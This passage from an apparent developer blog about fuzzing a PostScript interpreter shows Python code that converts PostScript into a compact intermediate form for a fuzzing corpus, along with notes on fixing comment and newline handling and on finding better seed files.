			out += _emit_number_token(val)
		elif kind == 'LNAME':
			defined_vars.append('/' + val)
			out += bytes([IR.I_LNAME]) + pack_allowed(val.encode('latin1'))
		elif kind == 'ENAME':
			out += _emit_name(val, defined_vars)
		elif kind == 'STRING':
			body = val[1:-1]
			out += bytes([IR.I_STRING]) + pack_allowed(body.encode('latin1'))
		elif kind == 'BOOL':
			out += bytes([IR.I_BOOL]) + bytes([val])  # val already 0/1
		elif kind == 'HEXDICT':
			out += _emit_hex_or_dict(val, defined_vars)
		elif kind == 'ARRAY':
			out += bytes([IR.ARR_S])
			inner = val[1:-1]
			inner_toks = _tokenize_expr(inner)
			encode_tokens(inner_toks, defined_vars, out)
			out += bytes([IR.ARR_E])
		elif kind == 'PROC':
			out += bytes([IR.PROC_S])
			inner = val[1:-1]
			inner_toks = _tokenize_expr(inner)
			encode_tokens(inner_toks, defined_vars, out)
			out += bytes([IR.PROC_E])
		else:
			# unknown token kinds are ignored
			pass

def ps_to_ir(ps_text: str) -> bytes:
	dprint("Called ps_to_ir...")
	defined_vars: List[str] = []
	out = bytearray()
	exprs = _split_expressions(ps_text)
	dprint("exprs: "+str(exprs))
	for line in exprs:
		toks = _tokenize_expr(line)
		encode_tokens(toks, defined_vars, out)
		out += bytes([IR.END_EXPR])
	return bytes(out)

import sys

def test():
	if len(sys.argv) != 2:
		ps = r"""/boxsize
		  inwidth inheight gt
		  { pagewidth inwidth truncate 1 .max div }
		  { pageheight inheight truncate 1 .max div }
		  ifelse
		def
		1 1 add
		"""
	else:
		fh = open(sys.argv[1], "r")
		ps = fh.read()
		fh.close()

	blob = ps_to_ir(ps)
	fh = open("output.bin", "wb")
	fh.write(blob)
	fh.close()
	print("Forward....")
	# print(IR.ir_to_postscript(blob).decode('latin1'))

	stuff = IR.ir_to_postscript(blob).decode('latin1')
	print(stuff)
	fh = open("roundtrip.ps", "w")
	fh.write(stuff)
	fh.close()
	return

if __name__=="__main__":
	test()
	exit(0)

```

Now, it really sucks that the percent sign is used for both comments and some special markers. This is bad design in my opinion, but too bad I guess...

There was another bug or actually my own design choice which made the fuzzer bad. I was under the assumption that newlines were only for show and didn't affect program execution, but I was painfully mistaken and as a result I now have this:

```

# ps_to_ir.py
import re
import struct
from typing import List, Tuple

import setup
import forward as IR

# Build operator index from your FUNCS list
setup.run_setup()
FUNCS = setup.FUNCS
FUNC_INDEX = {name: i for i, (name, _argc) in enumerate(FUNCS)}

# Allowed chars (must match your tiny_ps_ir.ALLOWED_CHARS)
ALLOWED = IR.ALLOWED_CHARS
IDX = {chr(c): i for i, c in enumerate(ALLOWED)}

NUMS = set(list("0987654321"))
HEX_NO_NUMS = set(list("abcdefABCDEF"))
HEX_CHARS = NUMS.union(HEX_NO_NUMS) # Can not do NUMS + HEX_NO_NUMS
SPECIAL_PCT_LINES   = { '%END', '%EOF', '%EOD', '%ENDDATA' }
SPECIAL_PCT_PREFIX  = ('%!', '%%')  # file header and DSC directives

DEBUG = False

def dprint(s: str) -> None:
	if DEBUG:
		print("[DEBUG] " + str(s))

def is_special_pct_line(line: str) -> bool:
	s = line.rstrip('\r\n')
	if any(s.startswith(p) for p in SPECIAL_PCT_PREFIX):
		return True
	# exact-match sentinels
	return s in SPECIAL_PCT_LINES

def pack_allowed(s: bytes) -> bytes:
	out = bytearray()
	s_dec = s.decode('latin1')
	for ch in s_dec:
		if ch in IDX:
			out.append(IDX[ch])
		else:
			dprint("Encountered invalid string: "+str(s_dec))
			# assert False
			out.append(IDX.get('A', 0))  # fallback
	out.append(0xFF)
	return bytes(out)

def pack_raw(s: bytes) -> bytes:
	assert len(s) <= 2**16
	out = struct.pack('<h', len(s)) + s
	assert len(out) == len(s) + 2
	return out

# ------------- Tokenizer (minimal but robust) -------------
_WS = b" \t\r\n\f\v"
_STOP = set(b"()[]{}<>/% \t\r\n\f\v")
_STOP_NO_COMMENT = set(b"()[]{}<>/ \t\r\n\f\v")
_comment = re.compile(rb'%[^\r\n]*')
_number = re.compile(rb'[+-]?(?:\d+\.\d*|\d*\.\d+|\d+)')

def _skip_comment(b: bytes, i: int) -> int:
	n = len(b)
	while i < n and b[i] not in b"\r\n":
		i += 1
	return i

def _read_string(b: bytes, i: int) -> Tuple[str, int]:
	out = bytearray(b'('); i += 1; depth = 1; n = len(b)
	while i < n and depth > 0:
		c = b[i]; out.append(c); i += 1
		if c == ord('\\'):
			if i < n: out.append(b[i]); i += 1
		elif c == ord('('): depth += 1
		elif c == ord(')'): depth -= 1
	return out.decode('latin1'), i

# def _read_string_raw(b: bytes, i: int) -> Tuple[str, int]:


def _read_balanced(b: bytes, i: int, o: int, c: int) -> Tuple[str, int]:
	out = bytearray([b[i]]); i += 1; depth = 1; n = len(b)
	while i < n and depth > 0:
		ch = b[i]
		if ch == ord('%'):
			j = _skip_comment(b, i); out += b[i:j]; i = j; continue
		if ch == ord('('):
			s, i = _read_string(b, i); out += s.encode('latin1'); continue
		out.append(ch); i += 1
		if ch == o: depth += 1
		elif ch == c: depth -= 1
	return out.decode('latin1'), i

def _read_hex_or_dict(b: bytes, i: int) -> Tuple[str, int]:
	n = len(b)
	if i + 1 < n and b[i+1] == ord('<'):
		# dict
		out = bytearray(b'<<'); i += 2; depth = 1
		while i < n and depth > 0:
			if b[i] == ord('%'):
				j = _skip_comment(b, i); out += b[i:j]; i = j; continue
			if b[i] == ord('('):
				s, i = _read_string(b, i); out += s.encode('latin1'); continue
			if i + 1 < n and b[i] == ord('<') and b[i+1] == ord('<'):
				out += b'<<'; i += 2; depth += 1; continue
			if i + 1 < n and b[i] == ord('>') and b[i+1] == ord('>'):
				out += b'>>'; i += 2; depth -= 1; continue
			out.append(b[i]); i += 1
		return out.decode('latin1'), i
	else:
		# hexstring
		out = bytearray(b'<'); i += 1
		while i < n:
			out.append(b[i]); c = b[i]; i += 1
			if c == ord('>'): break
		return out.decode('latin1'), i

def _read_word(b: bytes, i: int, disallowed_chars: set) -> Tuple[str, int]:
	n = len(b); s = i; nl = False
	while i < n and b[i] not in disallowed_chars:
		i += 1
	if not i < n:
		return b[s:i].decode('latin1'), i, nl
	dprint("b[i:] : "+str(b[i:]))
	dprint("b[i]: "+str(b[i]))
	if b[i] == ord('\n'): # Check for newline.
		nl = True
	return b[s:i].decode('latin1'), i, nl

def _split_expressions(ps: str) -> List[str]:
	"""Split PS into logical expressions. If a line starts with /name, keep reading until top-level 'def'."""
	# This ugly hack is to get rid of invalid characters...
	b = ps.encode('latin1', 'ignore'); i = 0; n = len(b)
	out, buf = [], bytearray()
	in_def = False
	while i < n:
		c = b[i]
		#if c == ord('%'):
		#	i = _skip_comment(b, i); continue

		if c == ord('%'):
			# flush any buffered code on this line
			line = buf.decode('latin1').strip()
			if line:
				out.append(line)
			buf.clear()
			j = _skip_comment(b, i)
			raw = b[i:j].decode('latin1').rstrip()
			dprint("raw: "+str(raw))
			if is_special_pct_line(raw):
				out.append(raw)  # keep as its own expression
			# consume newline if present
			i = j
			if i < n and b[i] in b'\r\n':
				if b[i] == ord('\r') and i+1 < n and b[i+1] == ord('\n'):
					i += 2
				else:
					i += 1
			continue

		if c == ord('('):
			s, i = _read_string(b, i); buf += s.encode('latin1'); continue
		if c == ord('['):
			s, i = _read_balanced(b, i, ord('['), ord(']')); buf += s.encode('latin1'); continue
		if c == ord('{'):
			s, i = _read_balanced(b, i, ord('{'), ord('}')); buf += s.encode('latin1'); continue
		if c == ord('<'):
			s, i = _read_hex_or_dict(b, i); buf += s.encode('latin1'); continue

		if not buf.strip() and c == ord('/'):
			in_def = True

		if in_def and c == ord('d') and b[i:i+3] == b'def' and (i+3 == n or b[i+3] in _WS + b"()[]{}<>/%"):
			buf += b'def'; i += 3
			out.append(buf.decode('latin1').strip()); buf.clear(); in_def = False
			while i < n and b[i] in _WS:
				if b[i] in b'\r\n':
					if b[i] == ord('\r') and i+1 < n and b[i+1] == ord('\n'): i += 2
					else: i += 1
					break
				i += 1
			continue

		if c in (ord('\n'), ord('\r')) and not in_def:
			line = buf.decode('latin1').strip()
			if line: out.append(line)
			buf.clear()
			if c == ord('\r') and i+1 < n and b[i+1] == ord('\n'): i += 2
			else: i += 1
			continue

		buf.append(c); i += 1

	last = buf.decode('latin1').strip()
	if last: out.append(last)
	return out

def _tokenize_expr(expr: str) -> List[Tuple[str, str]]:
	"""Return [('INT','123'), ('ENAME','moveto'), ('LNAME','box'), ('STRING','(abc)'), ...]"""
	b = expr.encode('latin1'); i = 0; n = len(b)
	toks: List[Tuple[str,str]] = []
	while i < n:
		while i < n and b[i] in _WS: i += 1
		if i >= n: break
		c = b[i]
		dprint("Current buffer: "+str(b[i:]))
		if c == ord('%'):
			# Check if special string...
			if not is_special_pct_line(expr):
				i = _skip_comment(b, i); continue # Is not special, so comment.
			else:
				dprint("String "+str(expr)+" is special...")
		elif c == ord('('):
			s, i = _read_string(b, i); toks.append(('STRING', s)); continue
		elif c == ord('['):
			s, i = _read_balanced(b, i, ord('['), ord(']')); toks.append(('ARRAY', s)); continue
		elif c == ord('{'):
			s, i = _read_balanced(b, i, ord('{'), ord('}')); toks.append(('PROC', s)); continue
		elif c == ord('<'):
			s, i = _read_hex_or_dict(b, i); toks.append(('HEXDICT', s)); continue
		elif c == ord('/'):
			i += 1; w, i, _ = _read_word(b, i, _STOP); toks.append(('LNAME', w)); continue
		elif c in (ord('}'), ord(')'), ord('>'), ord(']')):
			i += 1; continue
		m = _number.match(b, i)
		if m:
			txt = m.group(0).decode('latin1'); i = m.end()
			toks.append(('NUM', txt)); continue
		dprint("Current buffer 2: "+str(b[i:]))
		w, i, nl = _read_word(b, i, _STOP_NO_COMMENT)
		dprint("w: "+str(w))
		dprint("nl: "+str(nl))
		if w:
			if w not in ("false", "true"):
				toks.append(('ENAME', w))
			else:
				toks.append(('BOOL', 1 if w == "true" else 0))
			if nl:
				# Append newline end of expression too...
				toks.append(('END_EXPR', None))
	return toks

# ------------- Encoder: tokens -> IR (now fully recursive) -------------
def _emit_name(name: str, defined_vars: List[str]) -> bytes:
	if name in FUNC_INDEX:
		idx = FUNC_INDEX[name]
		return bytes([IR.LOOKUP_FUNC]) + struct.pack('<h', idx)
	if ('/' + name) in defined_vars:
		vidx = defined_vars.index('/' + name)
		return bytes([IR.LOOKUP_VAR]) + struct.pack('<h', vidx)
	return bytes([IR.I_ENAME]) + pack_allowed(name.encode('latin1'))

def _emit_number_token(val: str) -> bytes:
	if '.' in val:
		try:
			intpart, frac = val.split('.', 1)
			intpart = max(0, min(0xFFFF, int(intpart or '0')))
			frac = ''.join(ch for ch in frac if ch.isdigit()) or '0'
			frac = max(0, min(0xFFFF, int(frac)))
		except Exception:
			intpart, frac = 0, 0
		u = (intpart << 16) | frac
		return bytes([IR.I_REAL32]) + IR.varint_encode(IR.zz_encode(u))
	else:
		return bytes([IR.I_INT]) + IR.varint_encode(IR.zz_encode(int(val)))

def _clean_hex(s: str) -> str:
	o = ""
	for c in s:
		if c in HEX_CHARS:
			o += c
	return o

def _emit_hex_or_dict(val: str, defined_vars: List[str]) -> bytes:
	if val.startswith('<<'):
		# Keep as empty dict placeholder for now
		# return bytes([IR.DICT_S]) + bytes([IR.DICT_E])
		# Parse the inner tokens and keep them
		inner = val[2:-2]
		out = bytearray([IR.DICT_S])
		inner_toks = _tokenize_expr(inner)
		encode_tokens(inner_toks, defined_vars, out)
		out.append(IR.DICT_E)
		return bytes(out)
	else:
		# hexstring
		s = val[1:-1].strip()
		# Just throw out all non-hex characters...
		s = _clean_hex(s)
		# Maybe we should actually check like this here:
		# if len(s) % 2 == 1:
		# 	s = s + "0"
		if len(s) % 2 == 1:
			s = s[:-1] + "0" + s[-1]
		dprint("s: "+str(s))
		hexbytes = bytes.fromhex(s)
		return bytes([IR.I_HEX]) + pack_raw(hexbytes)

def encode_tokens(toks: List[Tuple[str, str]], defined_vars: List[str], out: bytearray) -> None:
	"""
	Recursively encode a token list into IR.
	Handles nested ARRAY and PROC (and HEXDICT) anywhere.
	"""
	for kind, val in toks:
		if kind == 'NUM':
			out += _emit_number_token(val)
		elif kind == 'LNAME':
			defined_vars.append('/' + val)
			out += bytes([IR.I_LNAME]) + pack_allowed(val.encode('latin1'))
		elif kind == 'ENAME':
			out += _emit_name(val, defined_vars)
		elif kind == 'STRING':
			body = val[1:-1]
			out += bytes([IR.I_STRING]) + pack_allowed(body.encode('latin1'))
		elif kind == 'BOOL':
			out += bytes([IR.I_BOOL]) + bytes([val])  # val already 0/1
		elif kind == 'HEXDICT':
			out += _emit_hex_or_dict(val, defined_vars)
		elif kind == 'ARRAY':
			out += bytes([IR.ARR_S])
			inner = val[1:-1]
			inner_toks = _tokenize_expr(inner)
			encode_tokens(inner_toks, defined_vars, out)
			out += bytes([IR.ARR_E])
		elif kind == 'PROC':
			out += bytes([IR.PROC_S])
			inner = val[1:-1]
			inner_toks = _tokenize_expr(inner)
			encode_tokens(inner_toks, defined_vars, out)
			out += bytes([IR.PROC_E])
		elif kind == 'END_EXPR':
			out += bytes([IR.END_EXPR])
		else:
			# unknown token kinds are ignored
			pass

def ps_to_ir(ps_text: str) -> bytes:
	dprint("Called ps_to_ir...")
	defined_vars: List[str] = []
	out = bytearray()
	exprs = _split_expressions(ps_text)
	dprint("exprs: "+str(exprs))
	for line in exprs:
		toks = _tokenize_expr(line)
		encode_tokens(toks, defined_vars, out)
		out += bytes([IR.END_EXPR])
	return bytes(out)

import sys

def test():
	if len(sys.argv) != 2:
		ps = r"""/boxsize
		  inwidth inheight gt
		  { pagewidth inwidth truncate 1 .max div }
		  { pageheight inheight truncate 1 .max div }
		  ifelse
		def
		1 1 add
		"""
	else:
		fh = open(sys.argv[1], "r")
		ps = fh.read()
		fh.close()

	blob = ps_to_ir(ps)
	fh = open("output.bin", "wb")
	fh.write(blob)
	fh.close()
	print("Forward....")
	# print(IR.ir_to_postscript(blob).decode('latin1'))

	stuff = IR.ir_to_postscript(blob).decode('latin1')
	print(stuff)
	fh = open("roundtrip.ps", "w")
	fh.write(stuff)
	fh.close()
	return

if __name__=="__main__":
	test()
	exit(0)

```

which should preserve the stuff and now this here:

```
/S 80 string def
108 480 moveto
/Helvetica 12 selectfont
 { currentfile S readline pop dup (%END) eq { pop exit } if
   gsave show grestore 0 -15 rmoveto
 } loop
Let the distance in inches from the left edge of the page to
the vertical line be H, and from the bottom edge to the
horizontal line be V; let the lengths of the gaps at the top
and bottom of the vertical line be T and B respectively
%END
/res currentpagedevice /HWResolution get def
(        x = (1 - H) * ) show res 0 get =string cvs show
(, y = (V - 1) * ) show res 1 get =string cvs show

showpage
```

roundtrips correctly. Before the lines were joined together which lead to crashes...

Now when running my corpus of over a thousand files it doesn't encounter any crash after roundtrip after running the thing. This does not mean that our corpus generator is perfect since there are functions which start with a percent sign and such function calls, but it is good enough for our purposes. I will of course improve upon this further...

## Starting fuzzing campaign number 2

Ok, so I started fuzzing again with a slightly improved corpus and some modifications...

## Getting an even better corpus

So my problem is that there is a bad corpus which doesn't exercise the majority of the stuff. Therefore I am thinking of getting a better corpus. I found this here:  https://labs.pdfa.org/stressful-corpus/ which seems

... an hour later ...

ok so that corpus didn't really have any interesting inputs in it, so I just decided to manually download some of the bugs out of the public bug tracker and just be done with it.

## Results???















